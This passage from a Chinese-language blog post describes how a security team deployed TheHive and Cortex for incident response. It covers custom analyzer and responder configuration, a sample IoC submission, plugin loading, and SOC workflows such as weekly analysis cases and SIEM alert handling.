class="string">&quot;smtp_pwd&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;SMTP server password&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;string&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;multi&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">&quot;required&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">&quot;defaultValue&quot;</span>: <span class="string">&quot;pwd&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;thehive_url&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;TheHive server address&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;string&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;multi&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">&quot;required&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="attr">&quot;defaultValue&quot;</span>: <span class="string">&quot;http://localhost:9000&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Threat-Intelligence"><a href="#Threat-Intelligence" class="headerlink" title="Threat Intelligence"></a>Threat Intelligence</h3><p>​    其实默认<em>TheHive</em>是推荐与<em>MISP</em>进行对接实现情报的<em>feed</em>。由于我们自建了威胁情报库，所以写了一个Responders插件，帮助在分析时提交IoC情报。这边代码就不上了。给出一个提交的用例：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;threat&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;ioc&quot;</span>: <span class="string">&quot;193.142.146.143&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;ip&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;tags&quot;</span>: [</span><br><span class="line">            <span class="string">&quot;burp scan&quot;</span></span><br><span class="line">        ],</span><br><span class="line">        <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;该IP在短时间内对用户登录接口发起大量访问，且包含着大量登录失败的情况&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;created_by&quot;</span>: <span class="string">&quot;canon@loveyou.com&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;producer&quot;</span>: <span class="string">&quot;Canon&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;provider&quot;</span>: <span class="string">&quot;TheHive&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;creation_time&quot;</span>: <span class="string">&quot;2021-05-14T09:48:23.664Z&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;modification_time&quot;</span>: <span class="string">&quot;2021-05-14T09:48:23.664Z&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;expiration_time&quot;</span>: <span class="string">&quot;2021-05-29T09:48:23.664Z&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;meta&quot;</span>: &#123;</span><br><span class="line">            <span class="attr">&quot;case&quot;</span>: [</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="attr">&quot;title&quot;</span>: <span class="string">&quot;安全分析 - 周报（05.10-05.14）&quot;</span>,</span><br><span class="line">                    <span class="attr">&quot;created_by&quot;</span>: <span class="string">&quot;canon@loveyou.com&quot;</span>,</span><br><span class="line">                    <span class="attr">&quot;owner&quot;</span>: <span class="string">&quot;canon@loveyou.com&quot;</span>,</span><br><span class="line">                    <span class="attr">&quot;link&quot;</span>: <span class="string">&quot;https://127.0.0.1:9000/index.html#!/case/~43769904/observables/~463080&quot;</span></span><br><span class="line">                &#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;timestamp&quot;</span>: <span class="string">&quot;2021-05-14T09:48:23.664Z&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="如何启用插件"><a href="#如何启用插件" class="headerlink" title="如何启用插件"></a>如何启用插件</h2><h3 id="加载插件"><a href="#加载插件" class="headerlink" title="加载插件"></a>加载插件</h3><ul>
<li>插件路径<ul>
<li> <code>/etc/cortex/Cortex-Analyzers/analyzers</code></li>
<li><code>/etc/cortex/Cortex-Analyzers/responders</code></li>
</ul>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ll /etc/cortex/Cortex-Analyzers/analyzers</span><br><span class="line">drwxr-xr-x 10 root root 4096 May  5 01:48 ./</span><br><span class="line">drwxr-xr-x 10 root root 4096 May  5 01:49 ../</span><br><span class="line">drwxr-xr-x  2 root root 4096 May  5 01:48 ProxyCheck/</span><br><span class="line">drwxr-xr-x  2 root root 4096 May  5 01:48 ThreatBook/</span><br><span class="line"></span><br><span class="line">$ ll /etc/cortex/Cortex-Analyzers/responders</span><br><span class="line">drwxr-xr-x  6 root root 4096 May  5 01:49 ./</span><br><span class="line">drwxr-xr-x 10 root root 4096 May  5 01:49 ../</span><br><span class="line">drwxr-xr-x  2 root root 4096 May  5 01:49 Mail/</span><br></pre></td></tr></table></figure>

<ul>
<li><p>修改配置文件<code>/etc/cortex/application.conf</code></p>
<p>建议大家将新增的插件与官方的插件区别开，这样后期也便于维护。</p>
</li>
</ul>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment">## ANALYZERS</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="string">analyzer</span> &#123;</span><br><span class="line">  <span class="string">urls</span> <span class="string">=</span> [</span><br><span class="line">    <span class="string">&quot;https://download.thehive-project.org/analyzers.json&quot;</span></span><br><span class="line">    <span class="string">&quot;/etc/cortex/Cortex-Analyzers/analyzers&quot;</span>	<span class="comment"># 新增自定义插件</span></span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># RESPONDERS</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="string">responder</span> &#123;</span><br><span class="line">  <span class="string">urls</span> <span class="string">=</span> [</span><br><span class="line">    <span class="string">&quot;https://download.thehive-project.org/responders.json&quot;</span></span><br><span class="line">    <span class="string">&quot;/etc/cortex/Cortex-Analyzers/responders&quot;</span>	<span class="comment"># 新增自定义插件</span></span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="启用插件"><a href="#启用插件" class="headerlink" title="启用插件"></a>启用插件</h3><ul>
<li><p><em>Analyzers</em></p>
<ul>
<li><em>ThreatBook - Analyzers Config</em></li>
</ul>
<p>![Analyzers Config](/Analyzers Config.png)</p>
<ul>
<li><em>ThreatBook - Analyzers</em></li>
</ul>
<p><img src="/2021/05/03/%E7%8E%A9%E8%BD%ACTheHive%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0/Analyzers.png" alt="Analyzers"></p>
</li>
<li><p><em>Responders</em></p>
<ul>
<li><em>Mail - Responders Config</em></li>
</ul>
<p>![Responders Config](/Responders Config.png)</p>
<ul>
<li><em>Mail - Responders</em></li>
</ul>
<p><img src="/2021/05/03/%E7%8E%A9%E8%BD%ACTheHive%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0/Responders.png" alt="Responders"></p>
</li>
</ul>
<h1 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h1><p>​    下面来说一下我们都用<em>TheHive</em>做了哪些，刚开始使用场景其实并不多，还需要后期的摸索。</p>
<p><img src="/2021/05/03/%E7%8E%A9%E8%BD%ACTheHive%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0/workflow.png" alt="workflow"></p>
<p>提前创建好模板，例如：按照Playbook的形式提前创建好。便于后期快速引用</p>
<ul>
<li><p>分析周报模板</p>
<p>按照周为单位创建Case，以天为单位创建Task。</p>
<p><img src="/2021/05/03/%E7%8E%A9%E8%BD%ACTheHive%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0/%E5%91%A8%E6%8A%A5%E6%A8%A1%E6%9D%BF.png" alt="周报模板"></p>
</li>
<li><p>应急响应模板</p>
<p>可以参照应急响应阶段来创建</p>
<p><img src="/2021/05/03/%E7%8E%A9%E8%BD%ACTheHive%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%A8%A1%E6%9D%BF.png" alt="应急响应"></p>
</li>
<li><p>引用模板</p>
<p><img src="/2021/05/03/%E7%8E%A9%E8%BD%ACTheHive%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0/%E5%BC%95%E7%94%A8%E6%A8%A1%E6%9D%BF.png" alt="引用模板"></p>
</li>
<li><p>事件运营：<em>SIEM</em>（<em>Alarm</em>） -&gt; <em>TheHive</em>（<em>Alert</em>）</p>
<p><em>TheHive</em>与<em>SIEM</em>做了对接，主要将两种类型的告警自动化的推送到了<em>TheHive</em>上。</p>
<ul>
<li><p>第一种：需要研判的安全事件。例如：基于内-&gt;外的<em>NetFlow</em>告警事件（异常端口访问，周期性请求等等）、敏感信息泄漏告警事件（黑客论坛监控、<em>GitHub</em>监控）。通常这类事件需要进行二次确认的，所以会选择通过<em>TheHive</em>来记录整个事件的处理过程。</p>
<p><img src="/2021/05/03/%E7%8E%A9%E8%BD%ACTheHive%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0/%E4%BA%BA%E5%B7%A5%E7%A0%94%E5%88%A4%E4%BA%8B%E4%BB%B6-1.png" alt="人工研判事件-1"></p>
</li>
<li><p>第二种：需要重点关注的安全事件。例如：<em>EDR</em>上的告警事件，命中C2指标的情报告警，通常这类事件需要第一时间去响应。</p>
<ul>
<li>在事件响应的过程中我们可以借助<em>Cortex Analyzers</em>的能力协助我们进行数据分析。如：同时调用多家情报厂商接口进行查询，丰富化数据信息（查询<em>PDNS</em>信息、<em>Whois</em>信息、CMDB等），联动<em>SIEM</em>查询近一段时间内的安全事件等。</li>
<li>对于已“实锤”的<em>指标</em>，可通过<em>Cortex Responders</em>组件与安全设备进行联动，批量下发阻断策略，及时止损。</li>
<li>对于跨部门协作的问题，可利用<em>TheHive</em>去同步事件响应的进度，包括在同一个Case里讨论该问题。</li>
<li>通过对响应过程的记录，可更好的帮助我们去优化安全事件响应流程，并同时帮助我们积累<em>Playbook</em>，为日后的自动化做铺垫。</li>
</ul>
</li>
</ul>
</li>
<li><p>规则运营：<em>SIEM</em>（<em>Alarm</em>、<em>Alert</em>）-&gt; <em>TheHive</em>（<em>Case</em>）</p>
<p>​        主要是将分析时发现的规则误报以及漏报的情况，通过手动提交<em>Case</em>的形式发送到<em>TheHive</em>上。例如，在<em>SIEM</em>上发现了某个告警存在误报的现象，通过<em>SIEM</em>提交该告警信息给指定负责人，系统会自动将邮件以及<em>Case</em>转到该人员名下。</p>
<ul>
<li>通过<em>SIEM</em>推送至<em>TheHive</em>，并通知分析人员进行规则优化。</li>
</ul>
<p><img src="/2021/05/03/%E7%8E%A9%E8%BD%ACTheHive%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0/%E8%A7%84%E5%88%99%E8%BF%90%E8%90%A5-4.png" alt="规则运营-4"></p>
<ul>
<li>提交Case并邮件通知</li>
</ul>
<p><img src="/2021/05/03/%E7%8E%A9%E8%BD%ACTheHive%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0/%E8%A7%84%E5%88%99%E8%BF%90%E8%90%A5-5.png" alt="规则运营-5"></p>
<p><img src="/2021/05/03/%E7%8E%A9%E8%BD%ACTheHive%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0/%E8%A7%84%E5%88%99%E8%BF%90%E8%90%A5-6.png" alt="规则运营-6"></p>
<ul>
<li>TheHive</li>
</ul>
<p><img src="/2021/05/03/%E7%8E%A9%E8%BD%ACTheHive%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0/%E8%A7%84%E5%88%99%E8%BF%90%E8%90%A5-7.png" alt="规则运营-7"></p>
<p><img src="/2021/05/03/%E7%8E%A9%E8%BD%ACTheHive%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0/%E8%A7%84%E5%88%99%E8%BF%90%E8%90%A5-8.png" alt="规则运营-8"></p>
</li>
<li><p>日常事项：</p>
<ul>
<li><p>安全分析周报</p>
<ul>
<li>以周为单位创建<em>Case</em></li>
</ul>
<p><img src="/2021/05/03/%E7%8E%A9%E8%BD%ACTheHive%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0/%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E5%91%A8%E6%8A%A501.png" alt="安全分析周报01"></p>
<ul>
<li>以天为单位创建<em>Task</em></li>
</ul>
<p><img src="/2021/05/03/%E7%8E%A9%E8%BD%ACTheHive%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0/%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E5%91%A8%E6%8A%A503.png" alt="安全分析周报03"></p>
<ul>
<li>告警与<em>Case</em>相关联</li>
</ul>
<p><img src="/2021/05/03/%E7%8E%A9%E8%BD%ACTheHive%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0/%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E5%91%A8%E6%8A%A505.png" alt="安全分析周报05"></p>
<ul>
<li>批量分析<em>IoC</em></li>
</ul>
<p><img src="/2021/05/03/%E7%8E%A9%E8%BD%ACTheHive%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0/%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E5%91%A8%E6%8A%A502.png" alt="安全分析周报02"></p>
<ul>
<li>分享给需要关注的小组</li>
</ul>
<p><img src="/2021/05/03/%E7%8E%A9%E8%BD%ACTheHive%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0/%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E5%91%A8%E6%8A%A504.png" alt="安全分析周报04"></p>
</li>
</ul>
</li>
</ul>
<hr>
<p><strong>写在最后：</strong>        </p>
<p>​    如果你有关注过开源解决方案的话，相信你一定有看到过一些<em>TheHive</em>与工作流（**<a href="https://medium.com/shuffle-automation">Shuffle</a>、<a href="https://docs.n8n.io/nodes/n8n-nodes-base.theHive/#basic-operations">n8n</a><strong>）组件整合的方案。不难看出，<em>TheHive</em>擅长的是事件响应与分析，这是一种半自动化的形式。通过与工作流组件的对接，你会发现这就是一个“</strong>散装*<em>”版的</em>SOAR<em>。商业的</em>SOAR<em>相比开源的</em>SOAR<em>多了一个“作战室”的概念，这个功能与</em>TheHive<em>就会有那么一些相似。例如：你可以在作战室中分析某个IP的情报信息，或者联动现有安全设备对某个</em>IoC<em>进行响应的操作。这些功能其实就是对应到了</em>TheHive<em>中的</em>Analyzers<em>与</em>Responders*的功能。</p>
<p>​    我个人觉得<em>TheHive</em>这种“半自动化”的形式，可以很好的与<em>SOAR</em>进行互补，相信与<em>SOAR</em>对接后会有更多的“价值”被体现出来。例如：在分析任务中可按照场景的不同有选择的调用<em>SOAR</em>的<em>PalyBook</em>，并将响应结果<em>feedback</em>至<em>TheHive</em>中。其实<em>TheHive</em>上还有挺多东西值得说的，一次也写不完。更多东西还需要我们根据实际场景再去挖掘，“思路”很重要！</p>
]]></content>
      <categories>
        <category>SIEM</category>
      </categories>
      <tags>
        <tag>SIEM</tag>
        <tag>SOC</tag>
        <tag>TheHive</tag>
      </tags>
  </entry>
</search>
